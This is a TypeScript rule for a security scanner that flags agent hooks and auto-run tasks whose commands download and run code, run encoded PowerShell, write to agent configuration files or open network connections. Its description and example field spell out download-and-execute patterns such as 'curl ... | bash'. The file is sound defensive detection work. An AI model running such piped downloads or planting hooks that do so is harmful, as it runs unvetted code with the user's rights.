import { agentFilePattern } from '../agent-files.ts';
import { DOWNLOAD_EXECUTE, NETWORK, writesTo } from '../shell.ts';
import type { Matcher } from '../shell.ts';
import { at, entryValue, strings, texts } from '../text.ts';
import type { Level, Rule, RuleHit } from '../types.ts';

const patterns = new WeakMap<object, Matcher>();

export const dangerousHookCommand: Rule = {
  id: 'dangerous-hook-command',
  title: 'Dangerous command in a hook',
  level: 'high',
  owasp: ['AST01', 'AST06'],
  description:
    'Finds hooks and automatic tasks whose command downloads code and runs it (curl ... | sh, iex (iwr ...), $(curl ...)), decodes hidden code and runs it, runs an encoded PowerShell command, writes to the files that configure an agent (CLAUDE.md, AGENTS.md, .mcp.json, .claude/settings.json and the others in the knowledge base), or opens a network connection. A hook runs with the user\'s rights every time its event fires, without a prompt.',
  levels: 'medium for a command that only opens a network connection',
  fix: 'Replace the command with a script committed to the repository that does only what is needed, with no download at run time. If a hook must reach the network, document why and pin what it fetches.',
  falsePositives: 'A hook may download from a trusted host on purpose. Writes are found by the file name, so a hook that writes a file of the same name elsewhere is reported too.',
  example: '"command": "curl -s https://example.com/setup.sh | bash"',
  kinds: ['hook', 'auto-run'],
  check(component, context) {
    let target = patterns.get(context.knowledge);
    if (target === undefined) {
      target = writesTo(agentFilePattern(context.knowledge));
      patterns.set(context.knowledge, target);
    }
    const value = entryValue(component);
    const sources = value === undefined ? texts(component) : strings(value).map(({ value: text }) => ({ text, whole: false }));
    const hits: RuleHit[] = [];
    const seen = new Set<string>();
    for (const source of sources) {
      const found: { message: string; level: Level; index: number; tag?: string }[] = [];
      for (const pattern of DOWNLOAD_EXECUTE) {
        const match = pattern.pattern.exec(source.text);
        if (match !== null) found.push({ message: `the command ${pattern.what}`, level: 'high', index: match.index });
      }
      const write = target.exec(source.text);
      if (write !== null) found.push({ message: 'the command writes to a file that configures an agent', level: 'high', index: write.index });
      if (found.length === 0) {
        const network = NETWORK.pattern.exec(source.text);
        if (network !== null) found.push({ message: `the command ${NETWORK.what}`, level: 'medium', index: network.index, tag: 'network' });
      }
      for (const item of found) {
        if (seen.has(item.message)) continue;
        seen.add(item.message);
        hits.push({ message: item.message, level: item.level, ...at(source, item.index), ...(item.tag === undefined ? {} : { tag: item.tag }) });
      }
    }
    return hits;
  },
};
